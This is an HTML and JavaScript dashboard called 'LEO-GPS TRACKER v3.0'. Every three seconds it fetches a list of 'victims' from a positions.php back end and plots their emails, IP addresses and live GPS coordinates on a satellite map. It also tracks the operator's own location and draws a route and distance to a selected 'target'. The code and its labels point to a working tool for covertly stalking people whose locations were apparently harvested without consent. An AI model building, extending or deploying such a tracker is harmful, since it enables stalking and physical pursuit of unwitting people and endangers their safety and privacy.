<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>ARIENS LEO-GPS TRACKER v3.0</title>
<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
<link rel="stylesheet" href="https://unpkg.com/leaflet.markercluster@1.6.0/dist/MarkerCluster.css"/>
<link rel="stylesheet" href="https://unpkg.com/leaflet.markercluster@1.6.0/dist/MarkerCluster.Default.css"/>
<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
<script src="https://unpkg.com/leaflet.markercluster@1.6.0/dist/leaflet.markercluster.js"></script>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:'Courier New',monospace}
body{background:#0a0a0a;color:#00ff41;overflow:hidden;height:100vh}
#hud{position:fixed;top:0;left:0;right:0;background:rgba(0,20,0,0.95);padding:8px 15px;font-size:12px;z-index:999;border-bottom:1px solid #00ff41;box-shadow:0 2px 10px rgba(0,255,65,0.3)}
#hud span{margin-right:20px}
#map{position:absolute;top:60px;left:0;width:100vw;height:calc(100vh - 60px);z-index:1}
#sidebar{position:fixed;right:0;top:80px;width:350px;height:calc(100vh - 100px);background:rgba(0,15,0,0.98);border-left:2px solid #00ff41;overflow-y:auto;z-index:1000;padding:15px}
#sidebar h3{color:#00ff41;margin-bottom:10px;font-size:13px}
.victim-track{background:rgba(50,0,0,0.6);margin:8px 0;padding:12px;border:1px solid #ff3333;border-radius:4px;cursor:pointer;transition:all 0.2s}
.victim-track:hover{background:rgba(70,0,0,0.8);transform:translateX(-5px)}
.victim-track.active{background:rgba(0,100,0,0.8);border-color:#00ff41}
.coord{font-family:monospace;background:#001100;padding:2px 6px;border-radius:3px;font-size:11px}
#controls{position:fixed;bottom:15px;right:15px;z-index:1001;background:rgba(0,0,0,0.9);padding:10px;border:1px solid #00ff41;border-radius:5px;display:flex;flex-wrap:wrap;gap:5px;max-width:300px}
.btn{background:#00ff41;color:#000;border:none;padding:8px 12px;margin:2px;cursor:pointer;font-family:inherit;font-size:11px;border-radius:3px;transition:all 0.2s;flex:1;min-width:80px}
.btn:hover{background:#00cc33;transform:scale(1.05)}
.btn.active{background:#ff3333;color:#fff}
#status{position:fixed;bottom:15px;left:15px;z-index:1001;background:rgba(0,0,0,0.9);padding:12px;border:1px solid #00ff41;border-radius:5px;font-size:11px;max-width:300px}
.military-icon{width:28px;height:28px;font-weight:bold;color:#ff3333 !important;border:3px solid #ff3333 !important;border-radius:50% !important;background:rgba(255,51,51,0.4) !important;display:flex;align-items:center;justify-content:center;font-size:12px !important;box-shadow:0 4px 12px rgba(255,51,51,0.5)}
.op-icon{background:#ffff00 !important;color:#000 !important;border-color:#ffff00 !important;box-shadow:0 4px 12px rgba(255,255,0,0.6)}
.route{stroke:#ff6b6b !important;stroke-width:4 !important;opacity:0.9 !important}
.route-active{stroke:#00ff41 !important;stroke-width:6 !important}
.victim-route{font-size:10px;color:#ffff00;background:rgba(255,255,0,0.2);padding:2px 6px;border-radius:3px}
.distance-info{font-size:10px;color:#00ff41;font-weight:bold}
</style>
</head>
<body>
<div id="hud">
<span>🛡️ LEO-GPS TRACKER v3.0 | </span
<span id="victimCount">0</span>
<span id="liveStatus">INITIALIZING</span>
<span id="opPos">-</span>
<span id="selectedVictim">-</span>
</div>
<div id="map"></div>
<div id="status">
<strong>📡 LIVE FEED</strong><br>
<div id="feed">-</div>
</div>
<div id="controls">
<button class="btn" onclick="fitVictims()">🎯 TRACK ALL</button>
<button class="btn" id="routesBtn" onclick="toggleRoutes()">🛤️ ROUTES</button>
<button class="btn" id="opBtn" onclick="toggleOP()">📱 OP GPS</button>
<button class="btn" onclick="clearMap()">🧹 CLEAR</button>
</div>
<div id="sidebar">
<h3>🎯 TARGET TRACKS <span id="sidebarCount">0</span></h3>
<div id="targetList"></div>
</div>

<script>
// GLOBAL STATE
let map, markerCluster, opMarker, opWatch, routes=[], victims=[], trackingMode=false, selectedVictim=null, opPosition={lat:0,lng:0};
const audioCtx = new (window.AudioContext || window.webkitAudioContext)();

// INIT MILITARY MAP
function initMilitaryMap() {
    map = L.map('map', {zoomControl:false, minZoom:1, maxZoom:22}).setView([0,0],2);
    L.control.zoom({position:'topleft'}).addTo(map);
    
    // Google Satellite HD (NO DATA ERRORS)
    L.tileLayer('https://mt1.google.com/vt/lyrs=s&x={x}&y={y}&z={z}', {
        attribution:'©Google', maxZoom:20
    }).addTo(map);
    
    markerCluster = new L.MarkerClusterGroup({
        maxClusterRadius:60, spiderfyOnMaxZoom:false, 
        iconCreateFunction: cluster => L.divIcon({
            html: `<div style="background:#ff4757;color:white;width:40px;height:40px;border-radius:50%;border:3px solid white;display:flex;align-items:center;justify-content:center;font-weight:bold;font-size:14px;box-shadow:0 4px 12px rgba(255,71,87,0.6)">${cluster.getChildCount()}</div>`,
            className: 'custom-cluster', iconSize: [40,40]
        })
    }).addTo(map);
    
    startTracking();
    initOP();
}

// HIGH PRECISION TRACKING (3s refresh)
async function startTracking() {
    setInterval(async () => {
        try {
            const res = await fetch('positions.php');
            const data = await res.json();
            
            if (data.length > victims.length) {
                beep();
                shakeScreen();
                showAlert(`🎯 ${data.length} NEW TARGETS LIVE`);
            }
            
            victims = data;
            document.getElementById('victimCount').textContent = data.length;
            document.getElementById('sidebarCount').textContent = `(${data.length})`;
            
            updateStatus(`LIVE: ${data.length} targets | ${new Date().toLocaleTimeString()}`);
            renderTargets(data);
            updateTargets();
            
            if (!trackingMode && data.length > 0) fitVictims();
            
        } catch(e) {
            updateStatus('ERROR: ' + e.message);
        }
    }, 3000);
}

// RENDER ALL TARGETS + ROUTES OP->VICTIM
function renderTargets(data) {
    markerCluster.clearLayers();
    routes.forEach(r => map.removeLayer(r));
    routes = [];
    
    data.forEach((victim, i) => {
        const pos = victim.latest;
        if (!pos.lat || !pos.lng || pos.lat === 0 || pos.lng === 0) return;
        
        // Victim marker
        const icon = L.divIcon({
            className: 'military-icon',
            html: `${i+1}`,
            iconSize: [32,32], iconAnchor: [16,16]
        });
        
        const marker = L.marker([pos.lat, pos.lng], {icon}).addTo(markerCluster);
        
        marker.victimData = victim;
        marker.on('click', () => selectVictim(victim));
        
        marker.bindPopup(`
            <b>🎯 TARGET #${i+1}</b><br>
            📧 ${victim.email}<br>
            🌐 ${victim.ip}<br>
            📍 ${pos.lat.toFixed(6)}, ${pos.lng.toFixed(6)}<br>
            📊 ${victim.count} waypoints<br>
            ⏰ ${pos.time}<br>
            <b>→ Cliquez pour tracer route OP</b>
        `);
        
        // Route OP -> Victim (distance calculée)
        if (opPosition.lat && opPosition.lng && selectedVictim?.id === victim.id) {
            const distance = calculateDistance(opPosition, pos);
            const route = L.polyline([
                [opPosition.lat, opPosition.lng],
                [pos.lat, pos.lng]
            ], {className: 'route route-active'});
            
            routes.push(route);
            map.addLayer(route);
            
            // Distance popup
            route.bindPopup(`📏 ${distance.toFixed(1)} km<br>OP → Target #${i+1}`);
        }
    });
}

// SELECT VICTIM + TRACE ROUTE OP→VICTIM
function selectVictim(victim) {
    selectedVictim = victim;
    document.getElementById('selectedVictim').textContent = `TARGET #${victim.id}: ${victim.email}`;
    
    // Update sidebar
    document.querySelectorAll('.victim-track').forEach(el => el.classList.remove('active'));
    const activeTrack = document.querySelector(`[data-victim-id="${victim.id}"]`);
    if (activeTrack) activeTrack.classList.add('active');
    
    // Re-render pour afficher route
    renderTargets(victims);
    map.setView([victim.latest.lat, victim.latest.lng], 15);
    beep();
}

// DISTANCE HAVERSINE (KM)
function calculateDistance(p1, p2) {
    const R = 6371; // Rayon Terre (km)
    const dLat = (p2.lat - p1.lat) * Math.PI / 180;
    const dLng = (p2.lng - p1.lng) * Math.PI / 180;
    const a = Math.sin(dLat/2) * Math.sin(dLat/2) +
              Math.cos(p1.lat * Math.PI / 180) * Math.cos(p2.lat * Math.PI / 180) *
              Math.sin(dLng/2) * Math.sin(dLng/2);
    const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
    return R * c;
}

// OP GPS TRACKING
function initOP() {
    if (!navigator.geolocation) return;
    opWatch = navigator.geolocation.watchPosition(pos => {
        opPosition = {
            lat: pos.coords.latitude,
            lng: pos.coords.longitude,
            accuracy: pos.coords.accuracy
        };
        document.getElementById('opPos').textContent = `OP: ${opPosition.lat.toFixed(6)},${opPosition.lng.toFixed(6)}`;
        
        if (opMarker) opMarker.setLatLng([opPosition.lat, opPosition.lng]);
        else {
            opMarker = L.marker([opPosition.lat, opPosition.lng], {
                icon: L.divIcon({
                    className: 'op-icon',
                    html: 'OP',
                    iconSize: [32,32], iconAnchor: [16,16]
                })
            }).addTo(map);
        }
        
        // Update routes si victime sélectionnée
        if (selectedVictim) renderTargets(victims);
        
    }, null, {enableHighAccuracy: true, timeout: 3000, maximumAge: 1000});
}

function toggleOP() {
    const btn = document.getElementById('opBtn');
    if (opWatch) {
        navigator.geolocation.clearWatch(opWatch);
        opWatch = null;
        btn.textContent = '📱 OP GPS';
        document.getElementById('opPos').textContent = '-';
        if (opMarker) map.removeLayer(opMarker);
    } else {
        initOP();
        btn.textContent = '⏹️ STOP OP';
    }
}

// UI FUNCTIONS
function fitVictims() {
    if (victims.length === 0) {
        map.setView([-3.37, 29.36], 10);
        return;
    }
    const bounds = L.latLngBounds(
        victims.map(v => [v.latest.lat, v.latest.lng]).filter(([lat, lng]) => lat && lng && lat !== 0 && lng !== 0)
    );
    map.fitBounds(bounds, {padding: [50, 50], maxZoom: 16});
}

function toggleRoutes() {
    const btn = document.getElementById('routesBtn');
    trackingMode = !trackingMode;
    btn.classList.toggle('active');
    btn.textContent = trackingMode ? '🛤️ HIDE' : '🛤️ ROUTES';
    renderTargets(victims);
}

function updateTargets() {
    document.getElementById('targetList').innerHTML = victims.map(v => `
        <div class="victim-track ${selectedVictim?.id === v.id ? 'active' : ''}" data-victim-id="${v.id}" onclick="selectVictim(${JSON.stringify(v).replace(/"/g, '&quot;')})">
            <b>#${v.id} ${v.email.slice(0,20)}${v.email.length>20?'...':''}</b><br>
            <span class="coord">${v.latest.lat?.toFixed(6) || 'N/A'}, ${v.latest.lng?.toFixed(6) || 'N/A'}</span><br>
            ${v.count} waypoints | ${v.ip}<br>
            ${selectedVictim?.id === v.id ? `<span class="victim-route">ROUTE ACTIVE</span>` : ''}
        </div>
    `).join('');
}

function clearMap() {
    victims = [];
    markerCluster.clearLayers();
    routes.forEach(r => map.removeLayer(r));
    routes = [];
    selectedVictim = null;
    updateStatus('🧹 MAP CLEARED');
}

function updateStatus(text) {
    document.getElementById('liveStatus').textContent = text;
    document.getElementById('feed').innerHTML = text;
}

function beep() {
    try {
        audioCtx.resume();
        const o = audioCtx.createOscillator(), g = audioCtx.createGain();
        o.connect(g); g.connect(audioCtx.destination);
        o.frequency.value = 1000; o.type = 'sine';
        g.gain.setValueAtTime(0.3, audioCtx.currentTime);
        g.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.3);
        o.start(audioCtx.currentTime); o.stop(audioCtx.currentTime + 0.3);
    } catch(e) {}
}

function shakeScreen() {
    document.body.style.animation = 'shake 0.5s';
    setTimeout(() => document.body.style.animation = '', 500);
}

function showAlert(text) {
    updateStatus(text);
}

// START
window.onload = () => {
    setTimeout(initMilitaryMap, 100);
    document.head.insertAdjacentHTML('beforeend', 
        '<style>@keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-5px)}75%{transform:translateX(5px)}}</style>'
    );
};
</script>
</body>
</html>
